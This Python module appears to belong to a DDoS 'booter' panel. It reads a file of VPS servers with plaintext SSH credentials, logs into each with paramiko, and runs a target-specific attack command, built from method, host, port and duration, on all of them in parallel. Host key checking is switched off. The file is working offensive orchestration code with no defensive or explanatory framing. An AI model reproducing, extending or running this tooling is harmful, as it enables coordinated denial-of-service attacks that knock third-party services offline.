import paramiko
import json
import time
import threading

from .parse_attack import parse_command

def execute_command_on_vps(command, server):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
      print(f"[ {server['hostname']} ] --> Launch Attack")
      ssh.connect(server['hostname'], port=22, username=server['username'], password=server['password'])
      stdin, stdout, stderr = ssh.exec_command(command)
      output = stdout.read().decode('utf-8')
    except paramiko.AuthenticationException as e:
        print(f"Failed to connect to {server['hostname']}: {e}")
    finally:
        ssh.close()
        time.sleep(1)

def launch_attacks(method, host, port, time):
    cmd = parse_command(method, host, port, time)

    with open('./data/vps_servers.json') as file:
        data = json.load(file)

    threads = []
    for server in data:
        thread = threading.Thread(target=execute_command_on_vps, args=(cmd, server))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()